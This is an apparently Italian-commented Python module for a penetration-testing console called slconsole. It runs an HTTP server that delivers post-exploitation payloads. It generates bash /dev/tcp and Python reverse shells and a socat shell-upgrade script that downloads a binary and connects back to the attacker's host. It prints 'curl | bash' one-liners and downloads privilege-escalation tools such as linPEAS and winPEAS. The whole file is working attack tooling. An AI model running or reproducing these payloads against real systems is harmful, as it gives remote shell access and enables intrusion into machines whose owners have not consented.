"""Quick-Delivery HTTP Server per slconsole.

Server HTTP in background che serve utility di post-exploitation:
  - Endpoint dinamici (/upgrade, /rev, /sh) che generano payload al volo
  - File statici dalla cartella static/ (linpeas.sh, winpeas.exe, ecc.)
"""
from __future__ import annotations

import http.server
import io
import os
import socket
import socketserver
import subprocess
import threading
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent
STATIC_ROOT = PROJECT_ROOT / "static"

_server: socketserver.TCPServer | None = None
_thread: threading.Thread | None = None
_lhost: str = ""
_lport: int = 4444


def get_default_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def discover_interfaces() -> list[tuple[str, str]]:
    """Return list of (interface_name, ipv4_address) for non-loopback interfaces."""
    results: list[tuple[str, str]] = []
    try:
        out = subprocess.run(
            ["ip", "-4", "-o", "addr", "show"],
            capture_output=True, text=True, timeout=5,
        )
        for line in out.stdout.strip().splitlines():
            parts = line.split()
            if len(parts) >= 4:
                iface = parts[1]
                addr = parts[3].split("/")[0]
                if addr != "127.0.0.1":
                    results.append((iface, addr))
    except Exception:
        fallback = get_default_ip()
        if fallback != "127.0.0.1":
            results.append(("default", fallback))
    return results


UPGRADE_TEMPLATE = r"""#!/bin/bash
# === slconsole shell upgrade ===
# Metodo 1: socat (preferito — TTY piena)
if command -v socat >/dev/null 2>&1; then
    echo "[*] socat trovato, upgrade diretto..."
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport} &
    exit 0
fi

# Metodo 2: scarica socat statico
echo "[*] Scaricamento socat statico..."
SOCAT_URL="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"
if command -v curl >/dev/null 2>&1; then
    curl -s -L "$SOCAT_URL" -o /tmp/socat
elif command -v wget >/dev/null 2>&1; then
    wget -q "$SOCAT_URL" -O /tmp/socat
else
    # Metodo 3: fallback python pty
    echo "[*] Nessun downloader, fallback a python pty..."
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "import pty,socket,os;s=socket.socket();s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')" &
    elif command -v python >/dev/null 2>&1; then
        python -c "import pty,socket,os;s=socket.socket();s.connect(('{lhost}',{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')" &
    else
        echo "[-] Nessun metodo disponibile per l'upgrade."
        exit 1
    fi
    exit 0
fi

chmod +x /tmp/socat
echo "[*] Lancio shell stabile verso {lhost}:{lport}..."
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{lhost}:{lport} &
"""

REVSHELL_BASH = "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\n"

REVSHELL_PYTHON = (
    "python3 -c 'import socket,subprocess,os;"
    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
    's.connect(("{lhost}",{lport}));'
    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
    "subprocess.call([\"/bin/bash\",\"-i\"])'\n"
)

INDEX_TEMPLATE = """<!DOCTYPE html>
<html><head><title>slconsole delivery</title></head><body>
<h2>slconsole — Quick Delivery Server</h2>
<h3>Endpoint dinamici</h3>
<ul>
  <li><code>curl {base}/upgrade | bash</code> — Upgrade shell (socat/python pty)</li>
  <li><code>curl {base}/rev</code> — Reverse shell Bash</li>
  <li><code>curl {base}/sh</code> — Reverse shell Python</li>
</ul>
<h3>File statici</h3>
<ul>
{file_list}
</ul>
<p><em>LHOST: {lhost} | LPORT: {lport}</em></p>
</body></html>
"""


class SlRequestHandler(http.server.BaseHTTPRequestHandler):

    def log_message(self, fmt, *args):
        client = self.client_address[0]
        msg = fmt % args
        print(f"\033[93m[serve]\033[0m {client} — {msg}")

    def _send_text(self, body: str, content_type: str = "text/plain") -> None:
        data = body.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _payload_vars(self) -> dict[str, str | int]:
        return {"lhost": _lhost, "lport": _lport}

    def do_GET(self) -> None:
        path = self.path.rstrip("/") or "/"
        pv = self._payload_vars()

        if path == "/":
            self._serve_index(pv)
        elif path in ("/upgrade", "/upgrade_revshell"):
            self._send_text(UPGRADE_TEMPLATE.format(**pv))
        elif path == "/rev":
            self._send_text(REVSHELL_BASH.format(**pv))
        elif path == "/sh":
            self._send_text(REVSHELL_PYTHON.format(**pv))
        else:
            self._serve_static(path)

    def _serve_index(self, pv: dict) -> None:
        files = []
        if STATIC_ROOT.is_dir():
            for f in sorted(STATIC_ROOT.iterdir()):
                if f.is_file() and not f.name.startswith("."):
                    size = f.stat().st_size
                    if size > 1_048_576:
                        label = f"{size / 1_048_576:.1f} MB"
                    elif size > 1024:
                        label = f"{size / 1024:.1f} KB"
                    else:
                        label = f"{size} B"
                    base = f"http://{_lhost}:{self.server.server_address[1]}"
                    files.append(
                        f'  <li><a href="/{f.name}"><code>{f.name}</code></a> ({label})'
                        f" — <code>curl {base}/{f.name} -o {f.name}</code></li>"
                    )
        file_list = "\n".join(files) if files else "  <li><em>Nessun file in static/</em></li>"
        base = f"http://{_lhost}:{self.server.server_address[1]}"
        html = INDEX_TEMPLATE.format(base=base, file_list=file_list, **pv)
        self._send_text(html, content_type="text/html")

    def _serve_static(self, path: str) -> None:
        name = path.lstrip("/")
        if ".." in name or name.startswith("/"):
            self.send_error(403)
            return
        target = STATIC_ROOT / name
        if not target.is_file():
            self.send_error(404, f"File non trovato: {name}")
            return
        try:
            data = target.read_bytes()
        except OSError:
            self.send_error(500)
            return
        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Content-Disposition", f'attachment; filename="{target.name}"')
        self.end_headers()
        self.wfile.write(data)


class _QuietTCPServer(socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


def start(port: int = 8000, lhost: str | None = None, lport: int = 4444) -> str:
    global _server, _thread, _lhost, _lport

    if _server is not None:
        return f"Server già attivo su porta {_server.server_address[1]}."

    _lhost = lhost or get_default_ip()
    _lport = lport

    try:
        _server = _QuietTCPServer(("", port), SlRequestHandler)
    except OSError as exc:
        return f"Impossibile avviare il server sulla porta {port}: {exc}"

    _thread = threading.Thread(target=_server.serve_forever, daemon=True)
    _thread.start()

    base = f"http://{_lhost}:{port}"
    out = [
        f"Server attivo su \033[92m{base}\033[0m  "
        f"(LHOST={_lhost}  LPORT={_lport})",
        "",
        f"  curl {base}/upgrade | bash",
        f"  curl {base}/rev | bash",
        f"  curl {base}/sh | bash",
    ]
    if STATIC_ROOT.is_dir():
        static_files = sorted(f for f in STATIC_ROOT.iterdir() if f.is_file() and not f.name.startswith("."))
        if static_files:
            out.append("")
            for f in static_files:
                name = f.name
                if name.endswith(".sh"):
                    out.append(f"  curl {base}/{name} | bash")
                elif name.endswith(".exe"):
                    out.append(f"  curl {base}/{name} -o {name}")
                else:
                    out.append(f"  curl {base}/{name} -o {name} && chmod +x {name}")
    return "\n".join(out)


def stop() -> str:
    global _server, _thread
    if _server is None:
        return "Nessun server attivo."
    _server.shutdown()
    _server.server_close()
    _server = None
    _thread = None
    return "Server arrestato."


def is_running() -> bool:
    return _server is not None


def status() -> str:
    if _server is None:
        return "Server non attivo."
    port = _server.server_address[1]
    return f"Server attivo su http://{_lhost}:{port}  (LHOST={_lhost}  LPORT={_lport})"


# ---------------------------------------------------------------------------
# Catalogo tool di post-exploitation da scaricare in static/
# ---------------------------------------------------------------------------

TOOL_CATALOG: list[dict[str, str]] = [
    {
        "name": "linpeas.sh",
        "url": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
        "desc": "LinPEAS — Linux Privilege Escalation",
    },
    {
        "name": "winPEASx64.exe",
        "url": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe",
        "desc": "WinPEAS x64 — Windows Privilege Escalation",
    },
    {
        "name": "winPEASx86.exe",
        "url": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe",
        "desc": "WinPEAS x86 — Windows Privilege Escalation",
    },
    {
        "name": "pspy64",
        "url": "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64",
        "desc": "pspy — monitor processi senza root",
    },
    {
        "name": "pspy32",
        "url": "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32",
        "desc": "pspy — monitor processi senza root (32bit)",
    },
    {
        "name": "linpeas_linux_amd64",
        "url": "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64",
        "desc": "LinPEAS binario statico — no bash/sh necessario",
    },
    {
        "name": "linux-exploit-suggester.sh",
        "url": "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh",
        "desc": "Linux Exploit Suggester — suggerisce exploit kernel",
    },
    {
        "name": "linenum.sh",
        "url": "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh",
        "desc": "LinEnum — enumerazione Linux classica",
    },
]


def _download_file(url: str, dest: Path) -> bool:
    try:
        subprocess.run(
            ["curl", "-sL", "--fail", "-o", str(dest), url],
            timeout=120, check=True,
        )
        return True
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError):
        pass
    try:
        subprocess.run(
            ["wget", "-q", "-O", str(dest), url],
            timeout=120, check=True,
        )
        return True
    except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError):
        pass
    return False


def fetch_tools(force: bool = False) -> str:
    STATIC_ROOT.mkdir(parents=True, exist_ok=True)
    lines: list[str] = []
    ok = 0
    skip = 0
    fail = 0

    for entry in TOOL_CATALOG:
        dest = STATIC_ROOT / entry["name"]
        if dest.exists() and not force:
            skip += 1
            lines.append(f"  \033[90m[skip]\033[0m {entry['name']}  (già presente)")
            continue
        print(f"  \033[93m[download]\033[0m {entry['name']}...")
        if _download_file(entry["url"], dest):
            size = dest.stat().st_size
            if size > 1_048_576:
                label = f"{size / 1_048_576:.1f} MB"
            else:
                label = f"{size / 1024:.1f} KB"
            ok += 1
            lines.append(f"  \033[92m[ok]\033[0m {entry['name']}  ({label})")
        else:
            fail += 1
            lines.append(f"  \033[91m[errore]\033[0m {entry['name']}  — download fallito")
            if dest.exists():
                dest.unlink()

    summary = f"\nRisultato: {ok} scaricati, {skip} già presenti, {fail} errori"
    lines.append(summary)
    lines.append(f"Cartella: {STATIC_ROOT}")
    return "\n".join(lines)


def list_static() -> str:
    if not STATIC_ROOT.is_dir():
        return "Cartella static/ non trovata."
    files = sorted(f for f in STATIC_ROOT.iterdir() if f.is_file() and not f.name.startswith("."))
    if not files:
        return "Nessun file in static/. Usa 'serve fetch' per scaricare i tool."
    if _server is not None:
        port = _server.server_address[1]
        base = f"http://{_lhost}:{port}"
    else:
        base = "http://<LHOST>:8000"
    lines = [f"\nFile in static/ ({len(files)}):"]
    for f in files:
        name = f.name
        if name.endswith(".sh"):
            lines.append(f"  curl {base}/{name} | bash")
        elif name.endswith(".exe"):
            lines.append(f"  curl {base}/{name} -o {name}")
        else:
            lines.append(f"  curl {base}/{name} -o {name} && chmod +x {name}")
    return "\n".join(lines)
